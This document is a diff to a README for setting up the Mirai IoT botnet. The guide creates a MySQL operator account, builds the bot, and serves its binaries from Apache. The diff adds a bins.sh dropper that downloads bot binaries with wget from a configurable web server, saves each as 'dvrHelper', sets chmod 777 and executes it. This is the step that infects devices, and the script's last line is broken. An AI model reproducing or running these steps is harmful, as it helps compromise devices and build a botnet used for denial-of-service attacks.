@@ -27,15 +27,12 @@ The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b
 # cd Mirai-Source-Code-plus/scripts
 # service mysql start
 ```
-Update mysql database with this script (root:root is the user & pass I’ve set in my Mysql-server)
-```
-# cat db.sql | mysql -u root -p root
-```
-Add users to mysql. 
+Add users to mysql.(mirai-pass should be a hard-to-crack password.)
 ```
 # mysql -u root -p root mirai
-> INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, '');
+> INSERT INTO users VALUES (NULL, 'anna-senpai', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, '');
 > exit
+# service mysql restart
 ```
 Cross Compile
 ```
@@ -82,6 +79,39 @@ In mirai folder, run build.sh script
 # cd ../mirai
 # chmod +x build.sh
 # ./build.sh debug telnet
+```
+Install Apache2 server.
+```
+# cd ../mirai/debug
+# sudo apt-get install apache2 -y
+# service apache2 start
+# cp mirai.* /var/www/html
+# cd /var/www/html
+# rm -fr /var/www/html/index.html
+```
+Check by entering localhost in a browser such as Fireforx.
+
+When you have finished checking, copy and paste the following code and save it as bins.sh.
+```
+#!/bin/sh
+
+# Edit
+WEBSERVER="IP OR HOSTNAME:80"
+# Stop editing now 
+
+BINARIES="mirai.arm mirai.m68k miraint.x86 miraint.spc miraint.sh4 miraint.ppc miraint.mpsl miraint.mips miraint.arm7 miraint.arm5n miraint.arm"
+
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/$Binary -O dvrHelper
+    chmod 777 dvrHelper
+    ./dvrHelper
+done
+
+rm -f "
+```
+Restart Apache2 after saving bins.sh
+```
+# service apache2 restart
 ```
 Build loader
 ```
